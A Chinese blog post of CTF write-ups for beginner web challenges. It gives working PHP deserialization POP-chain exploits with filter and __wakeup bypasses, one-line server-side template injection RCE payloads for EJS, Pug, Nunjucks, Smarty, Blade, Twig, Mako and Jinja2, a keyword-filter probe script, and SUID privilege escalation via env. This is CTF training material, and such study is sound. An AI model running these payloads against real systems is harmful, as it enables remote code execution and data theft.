---
title: 青岑CTF Web入门 WP
description: 整理自青岑CTF靶场
date: 2026-06-24 14:48:23
updated: 2026-06-24 14:48:23
image: /2026/青岑CTF Web入门 WP/cover.jpg
categories: [CTF]
---

## EZPOP

```php
$flag = file_get_contents("/flag");
class ShowFlag {
	public $show = false;
	public function __destruct() {
		if ($this->show) {
			echo $GLOBALS['flag'];
		}
	}
}
highlight_file(FILE);
if (isset($_GET['data'])) {
	unserialize($_GET['data']);
}
?>
```

令`$this->show`为`true`即可。

POC 

```php
<?php
class ShowFlag {
    public $show = true;
}
echo urlencode(serialize(new ShowFlag()));
?>
```



## EZPOP_1

```php
<?php
class ShowFlag {
    public $show = false;
    public $code = "";
    public function __destruct() {
        if ($this->show) {
            eval($this->code);
        }
    }
}
if (isset($_COOKIE["data"])) {
    unserialize($_COOKIE["data"]);
}
highlight_file(__FILE__);
```

可以令`$this->show`为`true`，然后进入`eval($this->code)`，这时去改变`$this->code`的值进行命令执行。

POC

```php
<?php
class ShowFlag
{
    public $show = true;
    public $code = "system('cat /flag');";
}
echo serialize(new ShowFlag());
```



## EZPOP_2

```php
<?php
$flag = file_get_contents("/flag");

class Fracture {
    public $delegate;

    public function __destruct() {
        if ($this->delegate) {
            $this->delegate->disperse();
        }
    }
}

class Specter {
    public $latch = false;

    public function __toString() {
        if ($this->latch) {
            return $GLOBALS['flag'];
        }
        return "no";
    }
}

class Thunk {
    public $operand;

    public function __invoke() {
        echo $this->operand;
    }
}

class Conduit {
    public $handler;

    public function disperse() {
        $f = $this->handler;
        return $f();
    }
}

highlight_file(__FILE__);

if (isset($_COOKIE['data'])) {
    unserialize($_COOKIE['data']);
}
?>
```

`flag` 是在 `Specter::__toString()` 里返回的，所以目标很明确，就是先让 `Specter` 里的 `$latch` 变成 `true`，再想办法触发一次 `__toString()`。

先看入口，`Fracture::__destruct()` 会在对象销毁时执行 `$this->delegate->disperse()`，所以最外层可以放一个 `Fracture` 对象。接着让它的 `$delegate` 指向 `Conduit`，因为 `Conduit::disperse()` 会把 `$this->handler` 取出来赋给 `$f`，然后执行 `$f()`。

这说明 `$handler` 需要是一个可调用对象，所以这里放 `Thunk`。当对象被当作函数调用时，会触发 `Thunk::__invoke()`，而 `__invoke()` 里有一行 `echo $this->operand`。

于是只要再把 `Thunk` 的 `$operand` 设成 `Specter` 对象，`echo` 对象时就会自动触发 `Specter::__toString()`。最后把 `Specter` 的 `$latch` 改成 `true`，整条利用链就是 `Fracture::__destruct()` -> `Conduit::disperse()` -> `Thunk::__invoke()` -> `Specter::__toString()`，这样就能把 `flag` 打出来。

POC

```php
<?php
class Fracture {
    public $delegate = true;
}
class Specter {
    public $latch = true;
}
class Thunk {
    public $operand;
}
class Conduit {
    public $handler;
}
$f = new Fracture();
$s = new Specter();
$c = new Conduit();
$t = new Thunk();
$t->operand = $s;
$c->handler = $t;
$f->delegate = $c;

echo urlencode(serialize($f));

?>
```



## EZPOP_3

```php
<?php
class Chrysalis {
    public $vector;

    public function __wakeup() {
        if ($this->vector) {
            $this->vector->catalyze();
        }
    }

    public function __destruct() {
        if ($this->vector) {
            $this->vector->expunge();
        }
    }
}

class Pulsar {
    public $token;

    public function __invoke() {
        echo $this->token;
    }
}


class Stratum {
    public $binding;

    public function __call($name, $args) {
        $f = $this->binding->$name;
        return $f();
    }
}

class Lattice {
    public $facet;

    public function expunge() {
        if ($this->facet instanceof Sluice) {
            $this->facet->drain();
        }
    }

    public function catalyze() {
        if ($this->facet) {
            $this->facet->surge();
        }
    }
}

class Lexicon {
    public $ambit;

    public function __get($name) {
        return $this->ambit;
    }
}


class Mirage {
    public $latch = false;
    public $a;

    public function __toString() {
        if ($this->latch) {
            eval($this->a);
            return '';
        }
        return "no";
    }
}

class Sluice {
    public function drain() {
        echo "decoy end\n";
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
?>
```

这一题的入口在 `Chrysalis::__wakeup()`，因为 `unserialize()` 时会自动调用它，而里面执行的是 `$this->vector->catalyze()`。所以最外层对象可以先放成 `Chrysalis`，让反序列化一开始就进入链子。

接着让 `Chrysalis` 的 `$vector` 指向 `Lattice`。在 `Lattice::catalyze()` 里，会继续调用 `$this->facet->surge()`。这里如果把 `$facet` 设成 `Stratum`，由于 `Stratum` 本身没有 `surge()` 这个方法，就会触发 `Stratum::__call()`。

`Stratum::__call()` 里先执行 `$f = $this->binding->$name`。因为这里访问的是不存在的属性，所以只要把 `$binding` 指向 `Lexicon`，就会触发 `Lexicon::__get()`，并返回 `$this->ambit`。这样 `$f` 实际上就变成了我们可控的对象。

下一行是 `return $f()`，说明 `$f` 需要能被当作函数调用，所以把 `Lexicon` 的 `$ambit` 设成 `Pulsar`。对象形式调用会触发 `Pulsar::__invoke()`，而这个方法里有 `echo $this->token`。

这样一来，再把 `Pulsar` 的 `$token` 设成 `Mirage` 对象，`echo` 时就会自动触发 `Mirage::__toString()`。真正的危险点就在这里，只要 `Mirage` 的 `$latch` 为 `true`，就会执行 `eval($this->a)`。

因此最后只需要把 `Mirage` 的 `$latch` 设为 `true`，再把 `$a` 填成命令执行代码，整条链子就是 `Chrysalis::__wakeup()` -> `Lattice::catalyze()` -> `Stratum::__call()` -> `Lexicon::__get()` -> `Pulsar::__invoke()` -> `Mirage::__toString()` -> `eval()`。

POC

```php
<?php
class Chrysalis {
    public $vector;
}
class Pulsar {
    public $token;
}
class Stratum {
    public $binding;
}
class Lattice {
    public $facet;
}
class Lexicon {
    public $ambit;
}
class Mirage {
    public $latch = true;
    public $a = "system('cat /flag');";
}
class Sluice {

}
$c = new Chrysalis();
$p = new Pulsar();
$s = new Stratum();
$la = new Lattice();
$le = new Lexicon();
$m = new Mirage();
$sl = new Sluice();

$p->token = $m;
$c->vector = $la;
$la->facet = $s;
$le->ambit = $p;
$s->binding = $le;
echo urlencode(serialize($c));
?>
```



## EZPOP_4

```php
<?php
error_reporting(0);

class ObsidianSanctum {
    public $note = "guest";
    public $flareValue = "";
    protected $gate = "";
    private $echoer;

    public function __destruct() {
        if (md5(md5($this->note)) == md5($this->gate)) {
            if (isset($this->echoer)) {
                $this->echoer->flare = $this->flareValue;
            }
        }
    }
}

class SpectralPrism {
    public $engine;
    public $payload;

    public function __set($name, $value) {
        if ($name === "flare" && $value === "ignite") {
            $runner = $this->engine;
            if (is_callable($runner)) {
                $runner($this->payload);
            } else {
                die("Denied.\n");
            }
        }
    }
}

class RuntimeScript {
    public function __invoke($source) {
        if (!is_string($source)) {
            die("Denied.\n");
        }
        eval($source);
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
?>
```

这一题的触发点在 `ObsidianSanctum::__destruct()`。析构时会先判断 `md5(md5($this->note)) == md5($this->gate)`，只要让 `$note = "1"`，再把 `$gate` 设成 `md5("1")`，也就是 `c4ca4238a0b923820dcc509a6f75849b`，这个条件就能成立。

条件通过之后，会继续判断 `isset($this->echoer)`，然后执行 `$this->echoer->flare = $this->flareValue`。这里的关键是原类中的 `$echoer` 是 `private`，所以序列化时不能直接靠外部正常赋值，只能先用 `public` 占位生成序列化字符串，再把属性名替换成真正的私有属性名 `\0ObsidianSanctum\0echoer`。

接着看赋值目标，如果把 `$echoer` 指向 `SpectralPrism`，那么给不存在的属性 `flare` 赋值时，就会触发 `SpectralPrism::__set()`。而 `__set()` 里要求 `$name === "flare"` 且 `$value === "ignite"`，所以把 `ObsidianSanctum` 的 `$flareValue` 设成 `ignite` 即可进入后续逻辑。

进入 `__set()` 后，代码会取出 `$this->engine` 赋给 `$runner`，并检查 `is_callable($runner)`。因此这里让 `SpectralPrism` 的 `$engine` 指向 `RuntimeScript` 对象，就能在后面的 `$runner($this->payload)` 里触发 `RuntimeScript::__invoke()`。

最后 `RuntimeScript::__invoke()` 会对传入的 `$source` 执行 `eval()`，所以只需要把 `SpectralPrism` 的 `$payload` 设成命令执行代码即可。整条利用链就是 `ObsidianSanctum::__destruct()` -> `SpectralPrism::__set()` -> `RuntimeScript::__invoke()` -> `eval()`。

POC

```php
<?php
class ObsidianSanctum {
    public $note = "1";
    public $flareValue = "ignite";
    protected $gate = "c4ca4238a0b923820dcc509a6f75849b";
    public $echoer;
}
class SpectralPrism {
    public $engine;
    public $payload = "system('cat /flag');";
}
class RuntimeScript {

}
$o = new ObsidianSanctum();
$s = new SpectralPrism();
$r = new RuntimeScript();
$s->engine = $r;
$o->echoer = $s;

$data = serialize($o);
$data = str_replace('s:6:"echoer";', 's:23:"' . "\0ObsidianSanctum\0echoer" . '";', $data);
echo urlencode($data);

?>
```



## EZPOP_5

```php
<?php
class ChronoVault {
    public $memo = "guest";
    protected $token = "none";
    private $isAdmin = false;
    public $bridge;

    public function __wakeup() {
        $this->token = "none";
        $this->isAdmin = false;
    }

    public function __destruct() {
        if ($this->isAdmin && $this->token === "QCCTFyyds" && isset($this->bridge)) {
            $this->bridge->fire($this->memo);
        }
    }
}

class DirectiveEngine {
    public $sandbox;

    public function __invoke() {
        return ($this->sandbox)();
    }
}

class EventBridge {
    public $engine;

    public function __call($name, $args) {
        return ($this->engine)();
    }
}

class ExecutionSandbox {
    public $script;

    public function __invoke() {
        if (preg_match("/flag/i", $this->script)) {
            die("Denied.\n");
        }
        eval($this->script);
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
?>
```

这一题的关键卡点在 `ChronoVault::__wakeup()`。正常情况下，反序列化时会把 `$token` 重置成 `none`，再把 `$isAdmin` 重置成 `false`，这样析构时的条件就永远进不去。

但题目环境是老版本 `PHP`，可以利用 `CVE-2016-7124` 这一类 `__wakeup()` 绕过。做法就是先正常构造对象，再把序列化结果里 `ChronoVault` 的属性数量从真实的 `4` 改成更大的值，让 `unserialize()` 时跳过 `__wakeup()`，这样我们伪造进去的 `$token` 和 `$isAdmin` 就能保留下来。

条件保住之后，`ChronoVault::__destruct()` 会执行 `$this->bridge->fire($this->memo)`。`EventBridge` 里并没有 `fire()` 这个方法，所以这里会自动触发 `EventBridge::__call()`，而 `__call()` 里直接执行的是 `($this->engine)()`。

这说明 `engine` 只需要是一个可调用对象即可，因此最短链就是让 `EventBridge` 的 `$engine` 直接指向 `ExecutionSandbox`。因为 `ExecutionSandbox` 本身实现了 `__invoke()`，所以对象函数调用时会直接进入 `ExecutionSandbox::__invoke()`。

最后的利用点就在 `ExecutionSandbox::__invoke()` 里的 `eval($this->script)`。虽然代码会用 `preg_match("/flag/i", $this->script)` 过滤掉直接出现的 `flag`，但这题实际不需要命令执行去读文件，因为 `flag` 就在 `phpinfo()` 的输出里，所以把 `$script` 设成 `phpinfo();` 即可。

整条链子就是：绕过 `ChronoVault::__wakeup()`，保留伪造的 `$token` 和 `$isAdmin`，然后在 `ChronoVault::__destruct()` 里触发 `EventBridge::__call()`，再进入 `ExecutionSandbox::__invoke()`，最终通过 `eval()` 执行 `phpinfo();`。

POC

```php
<?php
class ChronoVault {
    public $memo = "guest";
    protected $token = "QCCTFyyds";
    private $isAdmin = true;
    public $bridge;
}
class EventBridge {
    public $engine;
}
class ExecutionSandbox {
    public $script = "phpinfo();";
}

$o = new ChronoVault();
$b = new EventBridge();
$s = new ExecutionSandbox();

$b->engine = $s;
$o->bridge = $b;

$data = serialize($o);
$data = preg_replace('/^O:\d+:"ChronoVault":4:/', 'O:11:"ChronoVault":5:', $data);
echo urlencode($data);
?>

```



## EZPOP_6

```php
<?php
//经常做复杂的链子对身体不好，我们来个简单的吧
$flag = file_get_contents("/flag");

class A {
    public $obj;

    public function __destruct() {
        if (is_object($this->obj)) {
            echo $this->obj;
        }
    }
}

class B {
    public $data;

    public function __toString() {
        return $this->data->run();
    }
}

class C {
    public $qcctf = "nope";

    public function run() {
        if ($this->qcctf === "get_flag") {
            return $GLOBALS['flag'];
        }
        return "";
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    $data = str_replace("flag", "", $_GET['data']);
    @unserialize($data);
}
?>
```

这一题的链子非常短，入口就在 `A::__destruct()`。对象销毁时，如果 `$obj` 还是一个对象，就会执行 `echo $this->obj`，而 `echo` 对象时会自动触发 `__toString()`。

所以第一步就是让 `A` 的 `$obj` 指向 `B`。这样在 `A::__destruct()` 里输出 `B` 对象时，就会进入 `B::__toString()`。而 `B::__toString()` 里直接调用的是 `$this->data->run()`，因此再让 `B` 的 `$data` 指向 `C` 对象，就能继续进入 `C::run()`。

真正返回 `flag` 的条件在 `C::run()` 里，只有当 `$qcctf === "get_flag"` 时，才会返回 `$GLOBALS['flag']`。如果直接把这个值写成 `get_flag`，传参时会被外层的 `str_replace("flag", "", $_GET['data'])` 删掉，导致反序列化后的属性值不对。

不过这里的过滤发生在 `unserialize()` 之前，所以可以反过来利用这一点。只要先把序列化串里的 `get_flag` 替换成 `get_flflagag`，服务端在执行 `str_replace("flag", "", $_GET['data'])` 之后，就会把中间那段 `flag` 删掉，最终还原成真正想要的 `get_flag`。

这样一来，整条链子就是 `A::__destruct()` -> `B::__toString()` -> `C::run()`，同时利用前置的字符串替换把 `$qcctf` 修正回 `get_flag`，最后就能正常拿到 `flag`。

POC

```php
<?php
class A {
    public $obj;
}

class B {
    public $data;
}

class C {
    public $qcctf = "get_flag";
}

$a = new A();
$b = new B();
$c = new C();
$b->data = $c;
$a->obj = $b;
$poc = serialize($a);
$data = str_replace("flag","flflagag" , $poc);
echo $data;

?>
```



## EZPOP_7

```php
<?php
class Vault {
    public $name;
    protected $id;
    private $age;

    public function setAge($age) {
        $this->age = $age;
    }

    public function getAge() {
        return $this->age;
    }

    public function __invoke($id) {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class VaultA extends Vault {
    public function __destruct() {
        echo file_get_contents('/secret.txt');
    }
}

class VaultB extends Vault {
    public function __set($key, $value) {
        $this->name = $value;
    }
}

class VaultC extends Vault {
    public function __check($age) {
        $mix = serialize([$this->getAge(), $this->name]);
        if (stripos($mix, "flag") !== false) {
            die("Hacker!");
        }
    }

    public function __wakeup() {
        $age = $this->getAge();
        $name = $this->id;
        $name->setAge($age);
        $name($this);
    }
}

class VaultD extends Vault {
    public $token = "none";

    public function __invoke($obj) {
        if (isset($obj->token) && $obj->token === "QCCTFyyds") {
            if (is_string($obj->name) && stripos($obj->name, "flag") === false) {
                eval($obj->name);
            }
        }
    }
}

function is_printable($s) {
    for ($i = 0; $i < strlen($s); $i++) {
        if (!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125)) {
            return false;
        }
    }
    return true;
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    if (!is_printable($data)) {
        die("Nope");
    }
    $obj = @unserialize($data);
    if (!($obj instanceof VaultC)) {
        die("Nope");
    }
}
?>
```

这一题先看对可控 `GET` 变量 `data` 的限制。第一层限制是：

```php
$data = $_GET['data'];
if (!is_printable($data)) {
    die("Nope");
}
```

`is_printable()` 会逐字节检查传入字符串，要求所有字符都落在 `ASCII 32` 到 `125` 之间。问题在于，`PHP` 序列化 `protected` 和 `private` 属性时，会自动在属性名里插入不可见的空字节 `\x00`。这个字符的 `ASCII` 是 `0`，显然过不了 `is_printable()`。

绕过点就在 `PHP` 反序列化对大写 `S` 的处理上。普通字符串是小写 `s`，里面放的是真实字节；如果把它改成大写 `S`，就可以在字符串内容里使用转义形式。也就是说，原本会出现空字节的属性名可以从 `s:5:"\x00*\x00id"` 改写成 `S:5:"\00*\00id"`，这样传输时看到的都是可见字符，但反序列化时 `PHP` 会把 `\00` 还原回真正的 `\x00`。

第二层限制是：

```php
$obj = @unserialize($data);
if (!($obj instanceof VaultC)) {
    die("Nope");
}
```

这说明最外层入口对象必须是 `VaultC`，所以整条链子必须从 `VaultC::__wakeup()` 起。

再看终点，真正的危险点在 `VaultD::__invoke()` 里的 `eval()`：

```php
if (isset($obj->token) && $obj->token === "QCCTFyyds") {
    if (is_string($obj->name) && stripos($obj->name, "flag") === false) {
        eval($obj->name);
    }
}
```

这里要求传入的对象同时满足三个条件：一是有 `token` 属性且值严格等于 `QCCTFyyds`，二是 `name` 必须是字符串，三是 `name` 里不能直接出现 `flag`。所以我们最终要控制的其实就是 `VaultC` 对象本身，让它拥有：

- `$id = new VaultD()`
- `$token = "QCCTFyyds"`
- `$name = "system('cat /fla*');"`

之所以把命令写成 `cat /fla*`，是因为 `stripos($obj->name, "flag") === false` 会拦截直接出现的 `flag`，但通配符形式不包含连续的 `flag` 字样，依然可以匹配到目标文件。

触发链也很直接。`VaultC::__wakeup()` 里先取出 `$this->id` 赋给 `$name`，然后执行：

```php
$name($this);
```

如果让 `$this->id` 指向 `VaultD` 对象，那么这里就会触发 `VaultD::__invoke()`，而传进去的参数正是当前这个 `VaultC` 对象本身。这样 `VaultD::__invoke()` 看到的 `$obj` 就正好是我们伪造好的 `VaultC`。

所以这题其实不需要绕远链，最短利用路径就是：`VaultC::__wakeup()` -> `VaultD::__invoke()` -> `eval()`。难点不在链子，而在两个限制条件：一是入口对象必须是 `VaultC`，二是 `protected` 属性名里的空字节要靠大写 `S` 和 `\00` 绕过 `is_printable()`。

POC

```php
<?php
class VaultC {
    public $name = "system('cat /fla*');";
    protected $id;

    public function __construct() {
        $this->id = new VaultD();
    }
}

class VaultD {}

$a = new VaultC();
$a->token = "QCCTFyyds";
echo urlencode(serialize($a));
```

先生成普通序列化串，再把其中表示 `protected` 属性名的这一段：

```txt
s:5:"%00*%00id"
```

改成：

```txt
S:5:"\00*\00id"
```

也就是把小写 `s` 改成大写 `S`，同时把 `%00` 改成 `%5C00`，这样就能在保持全串可打印的前提下，让反序列化时还原出真正的 `protected` 属性名。



## EZPOP_8

```php
<?php
error_reporting(0);


final class StarRailCabin {
    public $crewBadge;
    public $catDoor;
    public $needle;
    public $haystack;

    public function __destruct() {
        if (isset($this->needle)) {
            $n = (string)$this->needle;
            if (strlen($n) > 5 || !is_numeric($n) || $n <= 999999) die("你行不行呀？");
            $gate = $this->catDoor;
            $gate->partner = "QingCen";
        }
    }
}

final class CatCafeGate {
    public $fortuneTeller;
    public $sparkler;

    public function __set($name, $value) {
        $oracle = $this->fortuneTeller;
        if ($oracle() === "QingCen") {
            $engine = $this->sparkler;
            $engine();
        }
    }
}

final class KleeFirework {
    public $spell;
    public $scroll;

    public function __invoke() {
        $cast = $this->spell;
        $words = $this->scroll;
        $cast($words);
    }
}

final class QingCen {
    public static function echo_name() {
        return "QingCen";
    }
}


highlight_file(__FILE__);

$payload = $_GET["data_qc.bz2"];
if (isset($payload)) {
    unserialize($payload);
} else {
    echo "上传类型不对哦";
}
?>
上传类型不对哦
```

这一题的入口还是在 `StarRailCabin::__destruct()`。只要 `$needle` 被设置过，就会先把它强转成字符串赋给 `$n`，然后检查三个条件：长度不能大于 `5`，必须是数字，而且数值要大于 `999999`。

这几个条件放在一起看，其实是在逼我们构造一个“看起来长度不超过 `5`，但数值比较时又能大于 `999999`”的值，可以用科学记数法绕过。后面一旦通过检查，就会执行 `$gate->partner = "QingCen"`，而 `partner` 在 `CatCafeGate` 里并不存在，所以这里会触发 `CatCafeGate::__set()`。

进入 `CatCafeGate::__set()` 之后，先取出 `$this->fortuneTeller` 赋给 `$oracle`，然后执行 `$oracle()`。因此这里需要让 `$fortuneTeller` 是一个可调用对象或可调用形式，并且返回值正好等于 `QingCen`。条件成立后，又会继续取出 `$this->sparkler` 赋给 `$engine`，再执行 `$engine()`。

这说明 `$sparkler` 也必须是一个可调用对象，所以最自然的做法就是放一个 `KleeFirework` 对象。因为 `KleeFirework` 实现了 `__invoke()`，对象函数调用时会进入 `KleeFirework::__invoke()`，然后取出 `$spell` 和 `$scroll`，执行 `$cast($words)`。

所以最后的利用点就在这里：把 `$spell` 设成一个可调用函数，把真正要执行的内容放进 `$scroll`，这样整条链子就会变成 `StarRailCabin::__destruct()` -> `CatCafeGate::__set()` -> `KleeFirework::__invoke()` -> `$cast($words)`。

这一题还有一个额外的坑，不在对象链本身，而在参数名。源码里取的是 `$_GET["data_qc.bz2"]`，但 `PHP` 解析 `GET` 参数名时，空格、`.` 和 `[` 都会参与特殊处理。正常直接传 `data_qc.bz2=...` 的话，参数名里的 `.` 会被转换成 `_`，最后进到 `$_GET` 里的键名就不是源码里要取的那个了。

解决办法就是把传入的变量名写成 `data[qc.bz2`。原因是 `PHP` 在解析参数名时，一旦遇到 `[`，就会把它当成数组语法的开始，这样后面的 `.` 就不会再被转换掉。也就是说，题目虽然代码里写的是 `$_GET["data_qc.bz2"]`，但真正传参时要用 `data[qc.bz2` 这个名字去卡住 `PHP` 的参数名解析规则。

POC

```php
<?php
final class StarRailCabin {
    public $catDoor;
    public $needle = "5e555";
}

final class CatCafeGate {
    public $fortuneTeller;
}

final class KleeFirework {
    public $spell = "system";
    public $scroll = "cat /flag;";
}

$s = new StarRailCabin();
$c = new CatCafeGate();
$k = new KleeFirework();
$c->fortuneTeller = $k;
$s->catDoor = $c;
echo serialize($s);

?>

```

## EZSSTI

Node.js 的，`<%= 7*7 %>` 检测返回 49 ，是 EJS 引擎，直接读`<%= global.process.mainModule.require('child_process').execSync('cat /flag') %>`。







## EZSSTI_1

还是 Node.js ，`#{7*7}` 返回 49 ，是 Pug  引擎，`#{global.process.mainModule.require('child_process').execSync('cat /flag')}` 这里需要查看源代码找到 flag 。



## EZSSTI_2

是 Nunjucks ，`{{"".constructor.constructor("return this.process.mainModule.require('child_process').execSync('cat /flag').toString()")()}}` 。





## EZSSTI_3

用 whatweb 看一下是 php 的，测试是 Smarty ，`{system('cat /flag')}` 。





## EZSSTI_4

还是 php 的，Blade 的，`@php   system("cat /flag"); @endphp` 。





## EZSSTI_5

还是 php ，Twig 的，`{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}` 。



## EZSSTI_6

经过测试发现是 Mako 。`${__import__('os').popen('cat /flag').read()}` 。





## EZSSTI_7

经过测试发现是 Jinja2 。`{{"".__class__.__bases__[0].__subclasses__()}}` 返回的有过滤，查看源代码找到返回的，用脚本找到`os._wrap_close` 是第141个，所以`{{"".__class__.__bases__[0].__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}` 

## EZSSTI_8

还是 Jinja2。还用上一题的，`{{"".__class__.__bases__[0].__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}`。

## EZSSTI_9

还能出，`{{"".__class__.__bases__[0].__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}`。

## EZSSTI_10

有过滤，写个脚本看看。

```python
import requests

url = "http://docker.qingcen.net:41803/?id="

tests = [
    "{{7*7}}",
    "__class__",
    "__base__",
    "__subclasses__",
    "__globals__",
    "popen",
    "os",
    "import",
    "eval",
    "builtins",
    "cat",
    "/flag",
    "self",
    "session",
    "lipsum",
    "cycler",
    "namespace",
    "Joiner",
    "get_flashed_messages",
]


def check(keyword):
    payload = "{{" + keyword + "}}"

    try:
        r = requests.get(
            url + requests.utils.quote(payload),
            timeout=5
        )

        text = r.text

        print("=" * 50)
        print("测试:", keyword)

        # 判断关键字是否被过滤
        if keyword in text:
            print("[+] 未过滤")
        else:
            print("[-] 可能被过滤")

        # 常见过滤提示
        filters = [
            "危险关键字",
            "禁止",
            "illegal",
            "forbidden",
            "blocked",
            "filter"
        ]

        for f in filters:
            if f.lower() in text.lower():
                print("[!] 发现过滤提示:", f)

        print("响应长度:", len(text))


    except Exception as e:
        print("请求错误:", e)


for t in tests:
    check(t)
```



过滤了下面的

```python
__class__
==================================================
__base__
==================================================
__subclasses__
==================================================
__globals__
==================================================
import
==================================================
self
==================================================
session
==================================================
lipsum
==================================================
cycler
==================================================
namespace
==================================================
Joiner
==================================================
get_flashed_messages

```

url_for 没被过滤，用这个`{{url_for.__globals__['os'].popen('cat /flag').read()}}`，这里面的关键字用 join 换一下。

```python
globals  dict(glob=a,al=b)|join

{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('cat /flag').read()}}
```







## EZSSTI_12

上一题还能用，`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('cat /flag').read()}}` 。





## EZSSTI_13

`cat /flag` 没结果，但是命令是可以正常执行的，而且 static 目录也进不去。这里卡住了，看了下康可师傅的 wp ，得 suid 提权，同时队友说 env 有个 hint ，看一下。

```txt
HOSTNAME=29bee48b6372
OLDPWD=/opt/___web_very_strange_42___
PORT=80
HOME=/opt/___web_very_strange_42___
PYTHONUNBUFFERED=1
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHON_SHA256=8d3ed8ec5c88c1c95f5e558612a725450d2452813ddad5e58fdb1a53b1209b78
WERKZEUG_SERVER_FD=3
PYTHONDONTWRITEBYTECODE=1
HINT=用我提个权吧
PATH=/usr/local/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
PYTHON_VERSION=3.11.14
PWD=/opt/___web_very_strange_42___
```



再结合康可的 wp ，预期解应该是 env 后看到提示，然后想到 suid 提权，然后用`/usr/local/bin/env`提权。

先找一下可以用来提权的。

`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('find / -perm -4000 -type f 2>/dev/null').read()}}`。

```txt
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/umount
/usr/bin/passwd
/usr/local/bin/env
```

正好就有`/usr/local/bin/env`，所以`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('/usr/local/bin/env cat /flag').read()}}`。



## EZSSTI_14

无回显，写入静态文件，`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('mkdir -p /app/static;cat /flag > /app/static/1.txt 2>&1').read()}}`，再访问`/static/1.txt`。































